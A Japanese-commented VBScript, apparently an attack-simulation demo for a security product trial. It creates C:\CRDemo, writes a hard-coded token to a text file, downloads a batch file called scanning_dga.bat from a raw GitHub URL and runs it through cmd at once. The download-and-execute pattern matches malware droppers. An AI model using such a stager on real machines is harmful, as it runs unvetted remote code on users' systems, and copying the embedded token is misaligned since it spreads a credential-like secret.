Function DownloadFile(strUrl,strFile,strFolder)
    ' ダウンロード用のオブジェクト
    Set objSrvHTTP = Wscript.CreateObject("Msxml2.ServerXMLHTTP")
    on error resume next
    Call objSrvHTTP.Open("GET", strUrl, False )
    if Err.Number <> 0 then
        Wscript.Echo Err.Description
        Wscript.Quit
    end if
    objSrvHTTP.Send

    if Err.Number <> 0 then
    ' おそらくサーバーの指定が間違っている
        Wscript.Echo Err.Description
        Wscript.Quit
    end if
    on error goto 0
    if objSrvHTTP.status = 404 then
        Wscript.Echo "URLが正しくありません(404)"
        Wscript.Quit
    end if
    ' バイナリデータ保存用オブジェクト
    Set Stream = Wscript.CreateObject("ADODB.Stream")
    Stream.Open
    Stream.Type = 1 ' バイナリ
    ' 戻されたバイナリをファイルとしてストリームに書き込み
    Stream.Write objSrvHTTP.responseBody
    ' ファイルとして保存
    Stream.SaveToFile strFolder & strFile, 2
    Stream.Close
End Function

Set objFS = CreateObject("Scripting.FileSystemObject")

objFS.CreateFolder("C:\CRDemo") 'CRDemoフォルダ作成

'tkn.txt作成
Set objFile = objFS.CreateTextFile("C:\CRDemo\tkn.txt")
objFile.WriteLine("Z0RWOj6HeheqUxcc9yYF1CVQ1gWFaI3yEDrN")
objFile.Close

'Webサイト上のフルパス
url = "https://raw.githubusercontent.com/crjptpp/tpplab_public/main/mdrpov/scanning_dga.bat"
'保存先フォルダ
folder = "C:\CRDemo\"
'保存したファイルの名前
filename = "scanning_dga.bat"

'ダウンロード
DownloadFile url, filename, folder

'ダウンロードしたあとに、.exeを実行する
cmd = "cmd /c " & folder & filename
Set objShell = WScript.CreateObject("WScript.Shell")
' Runで1を指定すると画面が表示される
objShell.Run cmd,1,true
set objShell = Nothing